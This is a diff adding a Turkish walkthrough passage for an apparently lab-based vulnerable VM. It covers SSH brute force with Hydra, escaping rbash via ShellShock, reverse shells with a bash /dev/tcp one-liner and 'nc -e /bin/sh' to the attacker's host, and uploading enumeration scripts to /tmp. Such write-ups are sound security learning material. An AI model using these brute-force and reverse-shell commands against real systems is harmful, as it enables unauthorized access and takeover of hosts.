@@ -368,12 +368,108 @@ SSH brute force için Hydra, Medusa, Ncrack gibi elimizde bol seçenek mevcut.Hy
 
     hydra -t 32 -l burtieo -P /usr/share/wordlists/rockyou.txt 10.0.2.9 ssh 
 
-
-
-
-
-
+Gerçekten uzun bir zaman sonra buluyoruz parolayı
     
+![screenshot](screenshots/49.png)
+
+    ssh burtieo@10.0.2.9
+    
+Diyorum ve şu ekran beni karşılıyor.
+
+![screenshot](screenshots/50.png)
+
+Yayy! :D
+
+Diyecekken sevinmekten vazgeçiyorum.
+
+![screenshot](screenshots/51.png)
+
+Hiç bir komutun çalışmadığı bir shelle düştüğümü farkediyorum çünkü.
+
+Arasanız bulamazsınız böyle shell'i :(
+
+Bu noktadan sonra yapılabilecek şeyler bir şekilde yetkimi arttırmaya çalışmak ya da komutları bir şekilde çalıştırmak.NetCat ile shelli dinlediğim bir porttan kendime atmakta işe yarayabilir.İçinde düştüğüm shell :( **rbash** olarak geçiyor.İnternette bu shell ile ilgili açık bulmayıda deneyebilirim.
+
+Bu yazdıklarımı sırası ile yapmaya ve araştırmaya başlıyorum.
+    
+Alttaki mükemmel site sayesinde bir çok komut buluyorum ve hepsini deniyorum.
+    
+[Mükemmel-Site](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)
+
+![screenshot](screenshots/52.png)
+
+Burda yapmaya çalıştığım şeyler shelli bir yerlere taşımak ya da başka programlar üzerinden shell komutları çalıştırmak ama nafile.En son SSH üzerinden ShellShock deniyorum sitede yazıldığı üzere.İyiden iyiye sinir oluyorum baya
+
+Ama sonunda kırılan rbash'ın çıkardığı çaat sesini kulaklarımda hissediyorum :D
+
+![screenshot](screenshots/53.png)
+
+ssh üzerinden komutları çalıştırmayı başarıyorum.
+
+    ssh burtieo@10.0.2.9 pwd
+    
+Şeklinde bir kullanıma sahip.
+
+Daha sonra shell'i değiştirmek için reverse shell atmayı deniyorum
+
+    ssh burtieo@10.0.2.9 "bash -i >& /dev/tcp/10.0.2.8/8080 0>&1"
+    
+Diyorum ancak çıktı yönlendirmesine izin vermiyor.
+
+![screenshot](screenshots/54.png)
+
+Bende NetCat ile denemeye karar veriyorum.
+
+    ssh burtieo@10.0.2.9 "nc -e /bin/sh 10.0.2.8 1337"
+    
+Diyorum ve dinlemek içinde başka bir terminalde
+
+    nc -lvp 1337
+    
+Yazıyorum ve Bingo artık daha kaliteli bir shell'e sahibiz.
+
+![screenshot](screenshots/55.png)
+    
+Bu noktadan sonra sağı solu karştırmaya başladım.Elimde az yetkili olan bir kullanıcını shelli vardı.İçerde neler yapabileceğimi bulmak için yardımcı script kullanmak en mantıklısı olduğundan Linux Enumeration Script buldum.Sorun bu şeyi içeri sokmaktı.
+
+Script için:[Buradan](https://highon.coffee/blog/linux-local-enumeration-script/)
+
+    wget https://highon.coffee/downloads/linux-local-enum.sh
+        
+Komutu ile sitede yazdığı üzere scripti bilgisayarıma çektim.İçeri dosya sokmak için ssh'ı kullanabilirdim.**SCP** yada **SSHFS** iş görebilirdi ama scp daha basit olduğundan ona yöneldim
+
+    scp linux-local-enum.sh burtieo@10.0.2.9:/tmp 
+    
+/tmp dizini en yetkisiz kullanıcıya bile genelde açık olduğu için workspace olarak orayı belirledim =)
+
+![screenshot](screenshots/56.png)
+
+Her şey gayet yolunca gitti.
+
+Şimdi sıra scripti çalıştırmaya geldi.Ama önce tmp dizininde garip isimli bir dizin daha olduğunu gördüm ama malesef açmaya yetkim yoktu.
+
+![screenshot](screenshots/57.png)
+
+Sonra scripti çalıştırdım ve çıktısını "deneme" isimli dosyaya yolladım.
+
+    bash linux-local-enum.sh > deneme
+    cat deneme
+    
+Çook uzun bir(screenshot çekmenin mantığı olmayacağı kadar) çıktı karşımdaydı neredeyse vm hakkında her bilgi olsada yararlı bir şeyler bulamadım bunun üzerine başka bir script bulup tekrar denemeye karar verdim çünkü yapılabilecek başka bir şey aklıma gelmiyordu.
+
+    git clone https://github.com/rebootuser/LinEnum.git
+    
+Yardımı ile script'i çektim ve karşı tarafa aynı şekilde yolladım.
+Sonrada çalıştırdım.
+
+Aynı şekilde çıktıya bakınca şu dikkat çekici bilgilere ulaştım:
+
+![screenshot](screenshots/59.png)
+
+![screenshot](screenshots/58.png)
+    
+Bu bilgilerden yola çıkarak wmstrt'yi çalıştırmayı denedim.Ama çalıştıramadım.
+
 
 
 
